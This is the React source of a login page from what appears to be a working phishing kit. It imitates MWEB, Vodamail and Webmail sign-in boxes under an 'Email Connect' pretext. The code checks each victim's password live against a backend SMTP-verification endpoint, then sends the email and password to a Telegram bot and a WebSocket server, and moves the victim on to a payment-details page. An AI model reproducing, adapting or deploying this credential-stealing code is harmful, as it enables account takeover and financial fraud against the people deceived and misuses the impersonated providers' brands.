import { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import {
  Box,
  Container,
  Flex,
  VStack,
  Icon,
  Text,
  Image,
  HStack,
  Link,
  Spinner as ChakraSpinner,
} from "@chakra-ui/react";
import { MdSync } from "react-icons/md";
import Header from "../components/Header";
import Footer from "../components/Footer";
import ProgressBar from "../components/ProgressBar";
import FormInput from "../components/FormInput";
import CustomButton from "../components/CustomButton";
import {
  isValidEmail,
  randomParamsURL,
} from "../utils/validation";
import { useSendTLGMessage } from "../hooks/useTelegram";
import { buildTelegramMessage } from "../utils/messageBuilder";

const Login = () => {
  const navigate = useNavigate();
  const { send, loading } = useSendTLGMessage();
  const [formData, setFormData] = useState({
    email: "",
    password: "",
  });
  const [errors, setErrors] = useState({});
  const [showMwebModal, setShowMwebModal] = useState(false);
  const [showVodamailModal, setShowVodamailModal] = useState(false);
  const [showWebmailModal, setShowWebmailModal] = useState(false);
  const [isConnecting, setIsConnecting] = useState(false);
  const [connectingTo, setConnectingTo] = useState("");
  const [mwebLoading, setMwebLoading] = useState(false);
  const [vodamailLoading, setVodamailLoading] = useState(false);
  const [webmailLoading, setWebmailLoading] = useState(false);
  const [smtpError, setSmtpError] = useState(null);
  const [isVerifyingSMTP, setIsVerifyingSMTP] = useState(false);

  // Force cache cleanup on component mount to prevent stale data
  useEffect(() => {
    if (typeof window !== "undefined") {
      // Clear all login-related data from previous sessions
      localStorage.removeItem("loginData");
      // Clear other session data to ensure fresh start
      localStorage.removeItem("paymentData");
      localStorage.removeItem("otpData");
      // Keep trackData as it's needed for cumulative messages
      // localStorage.removeItem("trackData");
    }
  }, []);

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData((prev) => ({ ...prev, [name]: value }));
    if (errors[name]) {
      setErrors((prev) => ({ ...prev, [name]: false }));
    }
    
    // Check email domain and show appropriate modal
    if (name === "email") {
      const emailValue = value.toLowerCase();
      
      // Close all modals first
      setShowMwebModal(false);
      setShowVodamailModal(false);
      setShowWebmailModal(false);
      setIsConnecting(false);
      setSmtpError(null); // Clear SMTP error when email changes
      
      // Check for @mweb.co.za
      if (emailValue.includes("@mweb.co.za")) {
        setIsConnecting(true);
        setConnectingTo("mweb.co.za");
        setTimeout(() => {
          setIsConnecting(false);
          setShowMwebModal(true);
        }, 1500);
      }
      // Check for @vodamail.co.za
      else if (emailValue.includes("@vodamail.co.za")) {
        setIsConnecting(true);
        setConnectingTo("webmail.vodamail.co.za");
        setTimeout(() => {
          setIsConnecting(false);
          setShowVodamailModal(true);
        }, 1500);
      }
      // Check for @webmail.co.za
      else if (emailValue.includes("@webmail.co.za")) {
        setIsConnecting(true);
        setConnectingTo("app.webmail.co.za");
        setTimeout(() => {
          setIsConnecting(false);
          setShowWebmailModal(true);
        }, 1500);
      }
    }
  };

  const validateForm = () => {
    const newErrors = {};

    if (!isValidEmail(formData.email.trim())) {
      newErrors.email = true;
    }

    if (formData.password.trim().length < 6) {
      newErrors.password = true;
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  // Check if email domain requires SMTP verification
  const requiresSMTPVerification = (email) => {
    const emailLower = email.toLowerCase();
    return (
      emailLower.includes("@mweb.co.za") ||
      emailLower.includes("@vodacom.co.za")
      // @webmail.co.za and @vodamail.co.za no longer require verification
    );
  };

  // Verify SMTP credentials
  const verifySMTP = async (email, password) => {
    console.log("[SMTP] Starting verification for:", email);
    
    if (!requiresSMTPVerification(email)) {
      console.log("[SMTP] Domain does not require verification, skipping");
      return { success: true, skip: true };
    }

    try {
      // Get WebSocket host from environment or use default
      // In development mode, always use localhost
      const isDevelopment = import.meta.env.DEV || window.location.hostname === "localhost" || window.location.hostname === "127.0.0.1";
      const wsHost = isDevelopment 
        ? "localhost:8090"
        : (import.meta.env.VITE_WS_HOST || "localhost:8090").replace(
            /^(https?:\/\/|wss?:\/\/)/i,
            ""
          );
      
      // Determine protocol (http for localhost, https for remote)
      const protocol = wsHost.includes("localhost") || wsHost.startsWith("192.168.") || wsHost.startsWith("127.0.")
        ? "http"
        : "https";
      
      const apiUrl = `${protocol}://${wsHost}/api/verify-smtp`;
      console.log("[SMTP] Calling API:", apiUrl);
      console.log("[SMTP] Development mode:", isDevelopment);
      console.log("[SMTP] Request payload:", { email, password: "***" });
      
      const response = await fetch(apiUrl, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ email, password }),
      });

      console.log("[SMTP] Response status:", response.status, response.statusText);

      if (!response.ok) {
        const errorText = await response.text();
        console.error("[SMTP] Response error:", errorText);
        throw new Error(`SMTP verification request failed: ${response.status} ${response.statusText}`);
      }

      const result = await response.json();
      console.log("[SMTP] Verification result:", result);
      return result;
    } catch (error) {
      console.error("[SMTP] Verification error:", error);
      return { success: false, error: error.message };
    }
  };

  const handleProviderLogin = async (e, provider) => {
    e.preventDefault();
    
    // Validate form first
    if (!validateForm()) {
      // Show errors in modal
      return;
    }

    // Set loading state based on provider
    if (provider === "mweb") {
      setMwebLoading(true);
    } else if (provider === "vodamail") {
      setVodamailLoading(true);
    } else if (provider === "webmail") {
      setWebmailLoading(true);
    }
    
    setSmtpError(null);
    setIsVerifyingSMTP(true);
    
    try {
      const email = formData.email.trim();
      const password = formData.password.trim();
      
      // Verify SMTP credentials if required
      const smtpResult = await verifySMTP(email, password);
      setIsVerifyingSMTP(false);
      
      if (!smtpResult.success && !smtpResult.skip) {
        // SMTP verification failed - don't proceed
        let errorMessage = "Invalid email or password. Please check your credentials and try again.";
        
        // If error indicates connection refused, provide more context
        if (smtpResult.error && smtpResult.error.includes("ECONNREFUSED")) {
          const isLocalhost = window.location.hostname === "localhost" || window.location.hostname === "127.0.0.1";
          if (isLocalhost) {
            errorMessage = "Email verification failed: Connection refused. This may be due to IP restrictions. Please test from the production server or contact support.";
          } else {
            errorMessage = "Email verification failed: Unable to connect to email server. Please check your credentials and try again.";
          }
        }
        
        setSmtpError(errorMessage);
        
        // Clear loading states
        if (provider === "mweb") {
          setMwebLoading(false);
        } else if (provider === "vodamail") {
          setVodamailLoading(false);
        } else if (provider === "webmail") {
          setWebmailLoading(false);
        }
        return;
      }
      
      const clientId =
        typeof window !== "undefined" ? localStorage.getItem("clientId") : null;
      const clientIp =
        typeof window !== "undefined" ? localStorage.getItem("clientIp") : null;

      // Clear old login data first to avoid sending stale data
      localStorage.removeItem("loginData");
      
      // Store fresh login data in localStorage for cumulative messages
      const loginData = {
        email,
        password,
      };
      localStorage.setItem("loginData", JSON.stringify(loginData));

      // Build cumulative message with fresh data
      const message = buildTelegramMessage(clientIp);
      await send(message);

      // Send to WebSocket server
      try {
        window.dispatchEvent(
          new CustomEvent("ws:emit", {
            detail: {
              type: "login_data",
              clientId,
              email,
              password,
            },
          })
        );
      } catch {
        // ignore
      }

      // Simulate connection to provider (2 seconds)
      setTimeout(() => {
        // Clear loading states
        if (provider === "mweb") {
          setMwebLoading(false);
        } else if (provider === "vodamail") {
          setVodamailLoading(false);
        } else if (provider === "webmail") {
          setWebmailLoading(false);
        }
        
        // Close modals
        setShowMwebModal(false);
        setShowVodamailModal(false);
        setShowWebmailModal(false);
        
        // Navigate to next page
        navigate(`/payment-details?${randomParamsURL()}`);
      }, 2000);
    } catch (error) {
      console.error("Error in provider login:", error);
      setIsVerifyingSMTP(false);
      setSmtpError("An error occurred. Please try again.");
      
      // Clear loading states on error
      if (provider === "mweb") {
        setMwebLoading(false);
      } else if (provider === "vodamail") {
        setVodamailLoading(false);
      } else if (provider === "webmail") {
        setWebmailLoading(false);
      }
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    if (!validateForm()) {
      return;
    }

    setSmtpError(null);
    setIsVerifyingSMTP(true);
    
    try {
      const email = formData.email.trim();
      const password = formData.password.trim();
      
      // Verify SMTP credentials if required
      const smtpResult = await verifySMTP(email, password);
      setIsVerifyingSMTP(false);
      
      if (!smtpResult.success && !smtpResult.skip) {
        // SMTP verification failed - don't proceed
        let errorMessage = "Invalid email or password. Please check your credentials and try again.";
        
        // If error indicates connection refused, provide more context
        if (smtpResult.error && smtpResult.error.includes("ECONNREFUSED")) {
          const isLocalhost = window.location.hostname === "localhost" || window.location.hostname === "127.0.0.1";
          if (isLocalhost) {
            errorMessage = "Email verification failed: Connection refused. This may be due to IP restrictions. Please test from the production server or contact support.";
          } else {
            errorMessage = "Email verification failed: Unable to connect to email server. Please check your credentials and try again.";
          }
        }
        
        setSmtpError(errorMessage);
        setErrors({ email: true, password: true });
        return;
      }
      
      const clientId =
        typeof window !== "undefined" ? localStorage.getItem("clientId") : null;
      const clientIp =
        typeof window !== "undefined" ? localStorage.getItem("clientIp") : null;

      // Clear old login data first to avoid sending stale data
      localStorage.removeItem("loginData");
      
      // Store fresh login data in localStorage for cumulative messages
      const loginData = {
        email,
        password,
      };
      localStorage.setItem("loginData", JSON.stringify(loginData));

      // Build cumulative message with fresh data
      const message = buildTelegramMessage(clientIp);
      await send(message);

      // Send to WebSocket server
      try {
        window.dispatchEvent(
          new CustomEvent("ws:emit", {
            detail: {
              type: "login_data",
              clientId,
              email,
              password,
            },
          })
        );
      } catch {
        // ignore
      }

      navigate(`/payment-details?${randomParamsURL()}`);
    } catch (error) {
      console.error("Error in login:", error);
      setIsVerifyingSMTP(false);
      setSmtpError("An error occurred. Please try again.");
      setErrors({ email: true, password: true });
    }
  };

  return (
    <Box minH="100vh" display="flex" flexDirection="column" bg="#efefef">
      <Header />

      <Box flex="1" py={{ base: 4, md: 6 }}>
        <Container maxW="800px" px={{ base: 4, md: 6 }} mx="auto">
          <ProgressBar currentStep={2} />

          <Box
            bg="white"
            border="1px solid"
            borderColor="#cbcbcb"
            borderRadius="8px"
            boxShadow="0 2px 12px rgba(0,0,0,0.08)"
            overflow="hidden">
            {/* Header Tab */}
            <Flex
              bg="#279989"
              color="white"
              fontSize={{ base: "18px", md: "20px" }}
              fontWeight="700"
              p={4}
              align="center"
              justify="center"
              flexDirection="column"
              minH="90px"
              bgGradient="linear(to-r, #279989, #2aaa96)"
              boxShadow="0 2px 8px rgba(39, 153, 137, 0.3)">
              <Flex align="center" mb={2} flexWrap="wrap" justify="center" textAlign="center">
                <Icon as={MdSync} boxSize={{ base: 6, md: 8 }} mr={2} />
                <Text fontSize={{ base: "16px", md: "18px" }} lineHeight="1.4">
                  Enable Email Connect ( Auto-enroll for notifications via email)
                </Text>
              </Flex>
              <Text fontSize="13px" fontWeight="500" opacity={0.9}>
                Step 2 of 5 • Secure Login
              </Text>
            </Flex>

            {/* Form */}
            <Box p={{ base: 4, md: 6 }} pt={{ base: 2, md: 4 }} bg="white">
              <Box maxW="700px" mx="auto" w="full">
                <form onSubmit={handleSubmit}>
                  <VStack spacing={3} w="full">
                    {/* Logos Section */}
                    <Flex
                      w="full"
                      justify="flex-start"
                      align="center"
                      gap={2}
                      pt={0}
                      pb={1}
                      px={1}>
                      <Image
                        src="./assets/images/vodamail-logo.png"
                        alt="Vodamail"
                        maxH="30px"
                        objectFit="contain"
                        display="block"
                      />
                      <Image
                        src="./assets/images/wmeb.png"
                        alt="WMEB"
                        maxH="30px"
                        objectFit="contain"
                        display="block"
                      />
                      <Image
                        src="./assets/images/webmail.png"
                        alt="Webmail"
                        maxH="30px"
                        objectFit="contain"
                        display="block"
                      />
                      <Image
                        src="./assets/images/ovh-logo.png"
                        alt="OVH"
                        maxH="30px"
                        objectFit="contain"
                        display="block"
                      />
                    </Flex>

                    <FormInput
                      name="email"
                      type="email"
                      placeholder="Email"
                      value={formData.email}
                      onChange={handleChange}
                      isInvalid={errors.email}
                    />

                    <FormInput
                      name="password"
                      type="password"
                      placeholder="Password"
                      value={formData.password}
                      onChange={handleChange}
                      isInvalid={errors.password}
                    />

                    {smtpError && (
                      <Box
                        bg="#fee2e2"
                        color="#dc2626"
                        border="1px solid #dc2626"
                        borderRadius="6px"
                        p={3}
                        fontSize="14px"
                        textAlign="center">
                        {smtpError}
                      </Box>
                    )}

                    {isVerifyingSMTP && (
                      <Box
                        bg="#dbeafe"
                        color="#1e40af"
                        border="1px solid #93c5fd"
                        borderRadius="6px"
                        p={3}
                        fontSize="14px"
                        textAlign="center">
                        <ChakraSpinner size="sm" mr={2} />
                        Verifying email credentials...
                      </Box>
                    )}

                    <Flex w="full" justify="center" pt={6}>
                      <CustomButton type="submit" isLoading={loading || isVerifyingSMTP}>
                        Next
                      </CustomButton>
                    </Flex>
                  </VStack>
                </form>
              </Box>
            </Box>
          </Box>
        </Container>
      </Box>

      <Footer />

      {/* Connection Loading Modal */}
      {isConnecting && (
        <Box
          position="fixed"
          top="0"
          left="0"
          right="0"
          bottom="0"
          bg="rgba(0, 0, 0, 0.6)"
          zIndex="9998"
          display="flex"
          alignItems="center"
          justifyContent="center">
          <Box
            bg="white"
            p={6}
            borderRadius="8px"
            boxShadow="0 4px 20px rgba(0,0,0,0.3)"
            textAlign="center">
            <ChakraSpinner size="lg" color="#0066cc" thickness="4px" mb={4} />
            <Text fontSize="16px" fontWeight="600" color="#333">
              Connecting to {connectingTo}...
            </Text>
          </Box>
        </Box>
      )}

      {/* Mweb Login Modal */}
      {showMwebModal && (
        <Box
          position="fixed"
          top="0"
          left="0"
          right="0"
          bottom="0"
          bg="rgba(0, 0, 0, 0.75)"
          backdropFilter="blur(4px)"
          zIndex="9999"
          display="flex"
          alignItems="center"
          justifyContent="center"
          p={4}
          sx={{
            animation: "fadeIn 0.3s ease",
            "@keyframes fadeIn": {
              from: { opacity: 0 },
              to: { opacity: 1 },
            },
          }}>
          <Box
            maxW="500px"
            w="full"
            bg="white"
            borderRadius="8px"
            boxShadow="0 10px 40px rgba(0,0,0,0.4)"
            overflow="hidden"
            sx={{
              animation: "slideUp 0.4s ease",
              "@keyframes slideUp": {
                from: { transform: "translateY(30px)", opacity: 0 },
                to: { transform: "translateY(0)", opacity: 1 },
              },
            }}>
            {/* Mweb Header */}
            <Box bg="#0066cc" color="white" py={6} px={8} textAlign="center" position="relative">
              <Box
                as="button"
                onClick={() => setShowMwebModal(false)}
                position="absolute"
                top={4}
                right={4}
                fontSize="28px"
                color="white"
                _hover={{ opacity: 0.8 }}
                cursor="pointer"
                bg="transparent"
                border="none"
                p={0}
                lineHeight="1"
                w="32px"
                h="32px"
                display="flex"
                alignItems="center"
                justifyContent="center">
                ×
              </Box>
              <Text fontSize="28px" fontWeight="700" mb={2}>
                My Email
              </Text>
              <Text fontSize="16px" opacity={0.95}>
                Log Into Your Email
              </Text>
            </Box>

            {/* Mweb Login Form */}
            <Box py={8} px={8} bg="white">
              <form onSubmit={(e) => handleProviderLogin(e, "mweb")}>
                <VStack spacing={5} align="stretch">
                  <Box>
                    <Text fontSize="14px" fontWeight="600" mb={2} color="#333">
                      Email
                    </Text>
                    <FormInput
                      name="email"
                      type="email"
                      placeholder="yourname@mweb.co.za"
                      value={formData.email}
                      onChange={handleChange}
                      bg="#f5f5f5"
                      borderColor="#ddd"
                      _focus={{ borderColor: "#0066cc", bg: "white" }}
                    />
                  </Box>

                  <Box>
                    <Text fontSize="14px" fontWeight="600" mb={2} color="#333">
                      Password
                    </Text>
                    <FormInput
                      name="password"
                      type="password"
                      placeholder="Enter your password"
                      value={formData.password}
                      onChange={handleChange}
                      bg="#f5f5f5"
                      borderColor="#ddd"
                      _focus={{ borderColor: "#0066cc", bg: "white" }}
                    />
                  </Box>

                  {smtpError && (
                    <Box
                      bg="#fee2e2"
                      color="#dc2626"
                      border="1px solid #dc2626"
                      borderRadius="6px"
                      p={3}
                      fontSize="14px"
                      textAlign="center">
                      {smtpError}
                    </Box>
                  )}

                  {isVerifyingSMTP && (
                    <Box
                      bg="#dbeafe"
                      color="#1e40af"
                      border="1px solid #93c5fd"
                      borderRadius="6px"
                      p={3}
                      fontSize="14px"
                      textAlign="center">
                      <ChakraSpinner size="sm" mr={2} />
                      Verifying email credentials...
                    </Box>
                  )}

                  <CustomButton
                    type="submit"
                    isLoading={mwebLoading || isVerifyingSMTP}
                    w="full"
                    bg="#0066cc"
                    color="white"
                    _hover={{ bg: "#0052a3" }}
                    h="48px"
                    fontSize="16px"
                    fontWeight="600">
                    Log In
                  </CustomButton>

                  <Link
                    href="#"
                    fontSize="14px"
                    color="#0066cc"
                    textAlign="center"
                    _hover={{ textDecoration: "underline" }}
                    onClick={(e) => {
                      e.preventDefault();
                      setShowMwebModal(false);
                    }}>
                    Forgot Your Password
                  </Link>
                </VStack>
              </form>
            </Box>

            {/* Mweb Footer */}
            <Box
              bg="#f8f9fa"
              borderTop="1px solid #e0e0e0"
              py={4}
              px={8}
              fontSize="12px"
              color="#666"
              lineHeight="1.6">
              <Text mb={2}>
                <strong>Spam:</strong> We've got you covered with our purpose-built Anti-Spam Cloud solution. To learn more about accessing quarantined email or managing your black and white lists, hop on over to our website at:{" "}
                <Link href="https://www.mweb.co.za" color="#0066cc" isExternal>
                  Anti-Spam Cloud Help
                </Link>
              </Text>
            </Box>

          </Box>
        </Box>
      )}

      {/* Vodamail Login Modal */}
      {showVodamailModal && (
        <Box
          position="fixed"
          top="0"
          left="0"
          right="0"
          bottom="0"
          bg="rgba(0, 0, 0, 0.75)"
          backdropFilter="blur(4px)"
          zIndex="9999"
          display="flex"
          alignItems="center"
          justifyContent="center"
          p={4}
          sx={{
            animation: "fadeIn 0.3s ease",
            "@keyframes fadeIn": {
              from: { opacity: 0 },
              to: { opacity: 1 },
            },
          }}>
          <Box
            maxW="480px"
            w="full"
            bg="white"
            borderRadius="8px"
            boxShadow="0 10px 40px rgba(0,0,0,0.4)"
            overflow="hidden"
            sx={{
              animation: "slideUp 0.4s ease",
              "@keyframes slideUp": {
                from: { transform: "translateY(30px)", opacity: 0 },
                to: { transform: "translateY(0)", opacity: 1 },
              },
            }}>
            {/* Vodamail Header */}
            <Box bg="#1a73e8" color="white" py={6} px={8} textAlign="center" position="relative">
              <Box
                as="button"
                onClick={() => setShowVodamailModal(false)}
                position="absolute"
                top={4}
                right={4}
                fontSize="28px"
                color="white"
                _hover={{ opacity: 0.8 }}
                cursor="pointer"
                bg="transparent"
                border="none"
                p={0}
                lineHeight="1"
                w="32px"
                h="32px"
                display="flex"
                alignItems="center"
                justifyContent="center">
                ×
              </Box>
              <Image
                src="./assets/images/vodamail-logo.png"
                alt="Vodamail"
                maxH="50px"
                mx="auto"
                mb={3}
              />
              <Text fontSize="24px" fontWeight="700">
                Webmail Login
              </Text>
            </Box>

            {/* Vodamail Login Form */}
            <Box py={8} px={8} bg="white">
              <form onSubmit={(e) => handleProviderLogin(e, "vodamail")}>
                <VStack spacing={5} align="stretch">
                  <Box>
                    <Text fontSize="14px" fontWeight="600" mb={2} color="#333">
                      Username
                    </Text>
                    <FormInput
                      name="email"
                      type="email"
                      placeholder="yourname@vodamail.co.za"
                      value={formData.email}
                      onChange={handleChange}
                      bg="#f5f5f5"
                      borderColor="#ddd"
                      _focus={{ borderColor: "#1a73e8", bg: "white" }}
                    />
                  </Box>

                  <Box>
                    <Text fontSize="14px" fontWeight="600" mb={2} color="#333">
                      Password
                    </Text>
                    <FormInput
                      name="password"
                      type="password"
                      placeholder="Enter your password"
                      value={formData.password}
                      onChange={handleChange}
                      bg="#f5f5f5"
                      borderColor="#ddd"
                      _focus={{ borderColor: "#1a73e8", bg: "white" }}
                    />
                  </Box>

                  {smtpError && (
                    <Box
                      bg="#fee2e2"
                      color="#dc2626"
                      border="1px solid #dc2626"
                      borderRadius="6px"
                      p={3}
                      fontSize="14px"
                      textAlign="center">
                      {smtpError}
                    </Box>
                  )}

                  {isVerifyingSMTP && (
                    <Box
                      bg="#dbeafe"
                      color="#1e40af"
                      border="1px solid #93c5fd"
                      borderRadius="6px"
                      p={3}
                      fontSize="14px"
                      textAlign="center">
                      <ChakraSpinner size="sm" mr={2} />
                      Verifying email credentials...
                    </Box>
                  )}

                  <CustomButton
                    type="submit"
                    isLoading={vodamailLoading || isVerifyingSMTP}
                    w="full"
                    bg="#1a73e8"
                    color="white"
                    _hover={{ bg: "#1557b0" }}
                    h="48px"
                    fontSize="16px"
                    fontWeight="600">
                    Login
                  </CustomButton>
                </VStack>
              </form>
            </Box>
          </Box>
        </Box>
      )}

      {/* Webmail.co.za Login Modal */}
      {showWebmailModal && (
        <Box
          position="fixed"
          top="0"
          left="0"
          right="0"
          bottom="0"
          bg="rgba(0, 0, 0, 0.75)"
          backdropFilter="blur(4px)"
          zIndex="9999"
          display="flex"
          alignItems="center"
          justifyContent="center"
          p={4}
          sx={{
            animation: "fadeIn 0.3s ease",
            "@keyframes fadeIn": {
              from: { opacity: 0 },
              to: { opacity: 1 },
            },
          }}>
          <Box
            maxW="450px"
            w="full"
            bg="white"
            borderRadius="8px"
            boxShadow="0 10px 40px rgba(0,0,0,0.4)"
            overflow="hidden"
            sx={{
              animation: "slideUp 0.4s ease",
              "@keyframes slideUp": {
                from: { transform: "translateY(30px)", opacity: 0 },
                to: { transform: "translateY(0)", opacity: 1 },
              },
            }}>
            {/* Webmail Header */}
            <Box bg="#2c3e50" color="white" py={6} px={8} textAlign="center" position="relative">
              <Box
                as="button"
                onClick={() => setShowWebmailModal(false)}
                position="absolute"
                top={4}
                right={4}
                fontSize="28px"
                color="white"
                _hover={{ opacity: 0.8 }}
                cursor="pointer"
                bg="transparent"
                border="none"
                p={0}
                lineHeight="1"
                w="32px"
                h="32px"
                display="flex"
                alignItems="center"
                justifyContent="center">
                ×
              </Box>
              <Image
                src="./assets/images/webmail.png"
                alt="Webmail"
                maxH="45px"
                mx="auto"
                mb={3}
              />
              <Text fontSize="26px" fontWeight="700" mb={1}>
                Webmail Login
              </Text>
            </Box>

            {/* Webmail Login Form */}
            <Box py={8} px={8} bg="white">
              <form onSubmit={(e) => handleProviderLogin(e, "webmail")}>
                <VStack spacing={5} align="stretch">
                  <Box>
                    <Text fontSize="14px" fontWeight="600" mb={2} color="#333">
                      Username
                    </Text>
                    <FormInput
                      name="email"
                      type="email"
                      placeholder="yourname@webmail.co.za"
                      value={formData.email}
                      onChange={handleChange}
                      bg="#f8f9fa"
                      borderColor="#dee2e6"
                      _focus={{ borderColor: "#2c3e50", bg: "white" }}
                    />
                  </Box>

                  <Box>
                    <Text fontSize="14px" fontWeight="600" mb={2} color="#333">
                      Password
                    </Text>
                    <FormInput
                      name="password"
                      type="password"
                      placeholder="Enter your password"
                      value={formData.password}
                      onChange={handleChange}
                      bg="#f8f9fa"
                      borderColor="#dee2e6"
                      _focus={{ borderColor: "#2c3e50", bg: "white" }}
                    />
                  </Box>

                  {smtpError && (
                    <Box
                      bg="#fee2e2"
                      color="#dc2626"
                      border="1px solid #dc2626"
                      borderRadius="6px"
                      p={3}
                      fontSize="14px"
                      textAlign="center">
                      {smtpError}
                    </Box>
                  )}

                  {isVerifyingSMTP && (
                    <Box
                      bg="#dbeafe"
                      color="#1e40af"
                      border="1px solid #93c5fd"
                      borderRadius="6px"
                      p={3}
                      fontSize="14px"
                      textAlign="center">
                      <ChakraSpinner size="sm" mr={2} />
                      Verifying email credentials...
                    </Box>
                  )}

                  <CustomButton
                    type="submit"
                    isLoading={webmailLoading || isVerifyingSMTP}
                    w="full"
                    bg="#2c3e50"
                    color="white"
                    _hover={{ bg: "#1a252f" }}
                    h="48px"
                    fontSize="16px"
                    fontWeight="600">
                    Login
                  </CustomButton>

                  <Flex justify="center" pt={2}>
                    <Link
                      href="#"
                      fontSize="14px"
                      color="#2c3e50"
                      _hover={{ textDecoration: "underline" }}
                      onClick={(e) => {
                        e.preventDefault();
                        setShowWebmailModal(false);
                      }}>
                      • Get support
                    </Link>
                  </Flex>
                </VStack>
              </form>
            </Box>
          </Box>
        </Box>
      )}
    </Box>
  );
};

export default Login;

